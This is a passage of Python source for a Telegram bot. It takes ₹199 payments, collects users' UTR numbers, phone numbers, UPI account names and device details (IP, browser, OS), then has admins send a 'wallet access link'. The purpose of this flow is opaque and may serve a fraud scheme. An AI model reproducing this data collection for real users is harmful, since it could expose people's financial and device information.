        asyncio.create_task(update.effective_message.reply_html("⛔ Admin only."))
        return None
    return u

async def cmd_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = _need_admin(update, context)
    if not u: return
    r = role_of(u)
    txt = t_admin_dashboard(count("payments", "WHERE status='pending'"), count("payments", "WHERE status='verified'"),
                            count("users", "WHERE blocked=1"), count("devices"), count("users", "WHERE role='user'"), r)
    await update.effective_message.reply_html(txt)

async def cmd_list(update, context, kind):
    u = _need_admin(update, context)
    if not u: return
    res = render_list(kind, 0)
    body, kbs, multi = res
    if isinstance(body, str):
        return await update.effective_message.reply_html(body)
    for i, text in enumerate(body):
        kb = kbs[i] if kbs else None
        if i == len(body) - 1:
            kb = kb_page(kind, 0, False, PAGE_SIZE < 10**9) if not kb else InlineKeyboardMarkup(list(kb.inline_keyboard) + (kb_page(kind, 0, False, True).inline_keyboard if kb_page(kind, 0, False, True) else []))
        await update.effective_message.reply_html(text, reply_markup=kb)

async def cmd_pending(update, ctx):  await cmd_list(update, ctx, "pending")
async def cmd_verified(update, ctx): await cmd_list(update, ctx, "verified")
async def cmd_devices(update, ctx):  await cmd_list(update, ctx, "devices")
async def cmd_users(update, ctx):    await cmd_list(update, ctx, "users")

async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = _need_admin(update, context)
    if not u: return
    
    users_cnt = count('users', "WHERE role='user'")
    pending_cnt = count('payments', "WHERE status='pending'")
    verified_cnt = count('payments', "WHERE status='verified'")
    
    price_val = int(re.sub(r'[^0-9]', '', setting('price', '199')) or 199)
    rev = verified_cnt * price_val
    
    await update.effective_message.reply_html(
        "📊 <b>LIVE STATS</b>\n" + LINE + "\n"
        f"👥 Total users     : {users_cnt}\n"
        f"⏳ Pending         : {pending_cnt}\n"
        f"✅ Verified        : {verified_cnt}\n"
        f"💰 Total revenue   : ₹{rev}\n"
        + LINE + f"\n🕒 {now()}")

# ---------- BOSS ONLY ----------
def _arg_id(update) -> int | None:
    parts = (update.effective_message.text or "").split()
    if len(parts) > 1:
        d = only_digits(parts[1])
        return int(d) if d else None
    return None

async def cmd_addmanager(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = _need_admin(update, context)
    if not u or role_of(u) != ROLE_BOSS:
        return await (update.effective_message.reply_html("👑 Sirf BOSS manager add kar sakta hai.") if u else None)
    tid = _arg_id(update)
    if not tid:
        return await update.effective_message.reply_html("✍️ Format: /addmanager CHAT_ID")
    user_touch(tid)
    u_set(tid, role=ROLE_MANAGER, blocked=0)
    add_log(u["chat_id"], ROLE_BOSS, "ADD_MANAGER", tid)
    await update.effective_message.reply_html(f"🧢 User <code>{tid}</code> ab <b>MANAGER</b> hai.")
    await send_to(context.bot, tid,
                  "🎉 <b>Aapko MANAGER banaya gaya hai!</b>\n/start dabaiye — admin panel khul jayega.\n"
                  "⚠️ Aapka har action BOSS ko report hoga.")

async def cmd_delmanager(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = _need_admin(update, context)
    if not u or role_of(u) != ROLE_BOSS:
        return await (update.effective_message.reply_html("👑 Sirf BOSS manager hata sakta hai.") if u else None)
    tid = _arg_id(update)
    if not tid:
        return await update.effective_message.reply_html("✍️ Format: /delmanager CHAT_ID")
    if tid == BOSS_CHAT_ID:
        return await update.effective_message.reply_html("🛑 Boss khud ko remove nahi kar sakta.")
    if not get_user(tid):
        return await update.effective_message.reply_html(f"❌ User <code>{tid}</code> register nahi hai.")
    u_set(tid, role=ROLE_USER, awaiting=None)
    add_log(u["chat_id"], ROLE_BOSS, "DEL_MANAGER", tid)
    await update.effective_message.reply_html(f"✅ User <code>{tid}</code> ab <b>normal user</b> hai.")
    await send_to(context.bot, tid, "ℹ️ Aapka manager access hata diya gaya hai. Ab aap normal user ho.")

async def cmd_managers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = _need_admin(update, context)
    if not u: return
    rows = sql_fetch("SELECT * FROM users WHERE role='manager' ORDER BY updated DESC")
    txt = [f"🧢 <b>MANAGERS</b>  ({len(rows)})\n{LINE}"]
    for m in rows:
        txt.append(f"• <code>{m['chat_id']}</code> — {E(m['fullname'] or '—')} (@{E(m['username']) if m['username'] else '—'})")
    if not rows:
        txt.append("Koi manager nahi. /addmanager 123456")
    txt.append(f"{LINE}\nBoss: <code>{BOSS_CHAT_ID}</code> 👑")
    await update.effective_message.reply_html("\n".join(txt))

# ══════════════════════════════════════════════════════════════════════
# 12.  TEXT HANDLER
# ══════════════════════════════════════════════════════════════════════
MAGIC_URL_RE = re.compile(r"^\s*/\s*(\d{4,16})\s*[_.:\- ]*\s*(url|link)\s+(.+)$", re.I | re.S)
MAGIC_RE     = re.compile(r"^\s*/\s*(\d{4,16})\s*[_.:\- ]*\s*(ok|no|bk|ub|url)\s*$", re.I)

async def on_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not priv(update): return
    msg = update.effective_message
    text = (msg.text or msg.caption or "").strip()
    if not text: return
    u = user_touch(update.effective_chat.id, update.effective_user.username, update.effective_user.first_name)

    if u["blocked"]: return await msg.reply_html(t_blocked())

    if text.startswith("/"):
        if is_admin(u):
            m = MAGIC_URL_RE.match(text)
            if m:
                rep = await do_action(context, u, "url", int(m.group(1)), "magic", m.group(3).strip())
                return await msg.reply_html(rep)
            m = MAGIC_RE.match(text)
            if m:
                rep = await do_action(context, u, m.group(2).lower(), int(m.group(1)), "magic")
                return await msg.reply_html(rep)
        if text.split()[0].split("@")[0].lstrip("/") not in {"start", "help", "status", "cancel", "qr", "panel", "pending", "verified", "devices", "users", "stats", "addmanager", "delmanager", "removemanager", "managers"}:
            return await msg.reply_html("❓ Unknown command. Type /help to see commands.")
        return

    if u["awaiting"] == "admin_url" and is_admin(u):
        tid = u["target_chat"]
        u_set(u["chat_id"], awaiting=None, target_chat=0)
        rep = await do_action(context, u, "url", tid, "admin_flow", text)
        return await msg.reply_html(rep)

    if u["awaiting"] == "utr":
        val, err = check_utr(text)
        if err: return await msg.reply_html(err)
        u_set(u["chat_id"], utr=val, awaiting="phone")
        return await msg.reply_html(f"✅ UTR saved: <code>{E(val)}</code>\n\n📝 <b>STEP 2 / 3 — PHONE NUMBER</b>\n{LINE}\nPlease send your 10-digit mobile number.")

    if u["awaiting"] == "phone":
        val, err = check_phone(text)
        if err: return await msg.reply_html(err)
        u_set(u["chat_id"], phone=val, awaiting="upi")
        return await msg.reply_html(f"✅ Phone saved: <code>{E(val)}</code>\n\n📝 <b>STEP 3 / 3 — UPI ACCOUNT NAME</b>\n{LINE}\nPlease enter the exact name associated with your bank account.")

    if u["awaiting"] == "upi":
        val, err = check_upi_name(text)
        if err: return await msg.reply_html(err)
        u_set(u["chat_id"], upi_name=val, awaiting=None)
        return await msg.reply_html("📋 <b>FINAL REVIEW</b>\n" + LINE + "\n"
                                    f"🧾 UTR Number      : <code>{E(u['utr'])}</code>\n📱 Phone Number    : <code>{E(u['phone'])}</code>\n🏦 UPI Account Name: {E(val)}\n"
                                    "Is everything correct? Click ✅ <b>SUBMIT</b> — or you can edit the details.", reply_markup=kb_review())

    if u["approved"] and not u["device_done"]:
        d = parse_device_report(text)
        did = sql_run("INSERT INTO devices(chat_id,username,fullname,ip,browser,device,os,raw,created) VALUES(?,?,?,?,?,?,?,?,?)",
                      (u["chat_id"], u["username"], u["fullname"], d["ip"], d["browser"], d["device"], d["os"], text[:1500], now()))
        u_set(u["chat_id"], device_done=1, awaiting=None)
        row = sql_one("SELECT * FROM devices WHERE id=?", (did,))
        await notify_admins(context.bot, device_report_html(u, row), kb_admin_device(u["chat_id"]))
        return await msg.reply_html("✅ <b>Device details recorded successfully.</b>\n" + LINE + "\n"
                                    "🔒 The admin will send the Wallet access link shortly.")

    if is_admin(u): return await msg.reply_html("❓ Command samajh nahi aaya. Menu ke liye /panel dabayein.")
    if u["pay_status"] == "pending": return await msg.reply_html("⏳ Your request is <b>pending</b> — under admin review. Check /status.")
    if u["pay_status"] == "verified": return await msg.reply_html(f"✅ You are verified.\n🔗 {E(setting('vurl', VERIFY_URL))}\n📌 {E(setting('vtext', VERIFY_TEXT))}")
    return await msg.reply_html(t_welcome_user(), reply_markup=kb_user_buy())

# ══════════════════════════════════════════════════════════════════════
# 13.  CALLBACK ROUTER
# ══════════════════════════════════════════════════════════════════════
async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    data = q.data or ""
    u = user_touch(q.from_user.id, q.from_user.username, q.from_user.first_name)
    if u["blocked"] and not is_admin(u): return await ans(q, "🚫 You are blocked", True)

    if data == "buy": return await cb_buy(update, context)
    if data == "pdone": return await cb_pdone(update, context)
    if data == "cancel": return await cb_cancel(update, context)
    if data == "confirm": return await cb_confirm(update, context)
    if data == "edit": return await cb_edit(update, context)
    if data == "noop": return await ans(q)

    if data.startswith("pg|"):
        if not is_admin(u): return await ans(q, "⛔ Admin only", True)
        _, kind, off = (data.split("|") + ["0"])[:3]
        try: off = int(off)
        except ValueError: off = 0
        res = render_list(kind, off)
        body, kbs, multi = res
        if isinstance(body, str):
            await safe_edit(q, body)
            return await ans(q)
        await ans(q)
        for i, t in enumerate(body):
            await send_to(context.bot, q.message.chat_id, t, kbs[i] if kbs else None)
        return

    if data.startswith("ac|"):
        if not is_admin(u): return await ans(q, "⛔ Admin only", True)
        _, act, tid = (data.split("|") + ["0"])[:3]
        tid = int(tid)
        if act == "url":
            u_set(u["chat_id"], awaiting="admin_url", target_chat=tid)
            await ans(q, "Ab URL bhejiye")
            return await q.message.reply_html(f"🔗 User <code>{tid}</code> ke liye <b>WALLET LINK</b> bhejiye 👇")
        
        rep = await do_action(context, u, act, tid, "button")
        await ans(q, rep.replace("<b>", "").replace("</b>", "").replace("<code>", "").replace("</code>", "")[:180])
        await q.message.reply_html(rep)
        if act in ("ok", "no", "bk", "ub"):
            label = {"ok": "✅ VERIFIED", "no": "❌ REJECTED", "bk": "🚫 BLOCKED", "ub": "🟢 UNBLOCKED"}[act]
            await safe_edit(q, None, InlineKeyboardMarkup([[InlineKeyboardButton(f"{label} by {role_of(u).upper()}", callback_data="noop")]]))
        return
    await ans(q, "❓ Unknown button", True)

# ══════════════════════════════════════════════════════════════════════
# 14.  ERROR HANDLER (SILENCED)
# ══════════════════════════════════════════════════════════════════════
async def on_error(update: object, context: ContextTypes.DEFAULT_TYPE):
    err = context.error
    # Sirf console me show hoga, bot me koi message nahi jayega
    LOG.error("ERROR SILENCED: %s", err)

# ══════════════════════════════════════════════════════════════════════
# 15.  BOOTSTRAP & RENDER HEALTH-CHECK SERVER
# ══════════════════════════════════════════════════════════════════════
class _HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
    def log_message(self, format, *args):
        return

def start_render_server():
    port = int(os.environ.get("PORT", 0))
    if port > 0:
        try:
            srv = HTTPServer(("0.0.0.0", port), _HealthHandler)
            threading.Thread(target=srv.serve_forever, daemon=True).start()
            LOG.info("🌐 Render port server bound on port %d", port)
        except Exception as e:
            LOG.warning("Port bind skipped: %s", e)

def build_request():
    kw = dict(connection_pool_size=8, read_timeout=60.0, write_timeout=60.0, connect_timeout=30.0, pool_timeout=30.0)
    try:
        if "media_write_timeout" in inspect.signature(HTTPXRequest.__init__).parameters: kw["media_write_timeout"] = 120.0
    except Exception: pass
    try: return HTTPXRequest(**kw)
    except Exception: return HTTPXRequest()

async def post_init(application: Application):
    # Only safe user commands in the global menu box
    cmds = [BotCommand("start", "Main Menu"),
            BotCommand("status", "Check payment status"),
            BotCommand("qr", "Get payment QR"),
            BotCommand("cancel", "Cancel current action"),
            BotCommand("help", "Help & Commands")]
    try: await application.bot.set_my_commands(cmds)
    except Exception: pass
    LOG.info("✅ %s ONLINE", BRAND)

def register(app: Application):
    h = app.add_handler
    h(CommandHandler("start", cmd_start))
    h(CommandHandler("help", cmd_help))
    h(CommandHandler("status", cmd_status))
    h(CommandHandler("qr", cmd_qr))
    h(CommandHandler("cancel", cmd_cancel))
    h(CommandHandler(["panel", "menu"], cmd_panel))
    h(CommandHandler("pending", cmd_pending))
    h(CommandHandler("verified", cmd_verified))
    h(CommandHandler("devices", cmd_devices))
    h(CommandHandler("users", cmd_users))
    h(CommandHandler("stats", cmd_stats))
    h(CommandHandler("addmanager", cmd_addmanager))
    h(CommandHandler(["delmanager", "removemanager"], cmd_delmanager))
    h(CommandHandler("managers", cmd_managers))
    h(CallbackQueryHandler(on_callback))
    h(MessageHandler(filters.TEXT & ~filters.UpdateType.EDITED, on_text))
    app.add_error_handler(on_error)

def boot_logging():
    logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)-7s | %(message)s")
    logging.getLogger("httpx").setLevel(logging.WARNING)

def seed():
    user_touch(BOSS_CHAT_ID)
    u_set(BOSS_CHAT_ID, role=ROLE_BOSS, blocked=0)
    for m in SEED_MANAGERS:
        user_touch(m)
        u_set(m, role=ROLE_MANAGER, blocked=0)
    if not setting("price"): set_setting("price", "199")

def main():
    boot_logging()
    start_render_server()
    db_init(); seed()
    try:
        asyncio.get_event_loop()
    except RuntimeError:
        asyncio.set_event_loop(asyncio.new_event_loop())
    builder = Application.builder().token(BOT_TOKEN).request(build_request())
    for meth, arg in (("concurrent_updates", True), ("post_init", post_init)):
        try: builder = getattr(builder, meth)(arg)
        except Exception: pass
    app = builder.build()
    if getattr(app, "post_init", None) is None: app.post_init = post_init
    register(app)
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    while True:
        try: main(); break
        except KeyboardInterrupt: break
        except Exception: time.sleep(10)
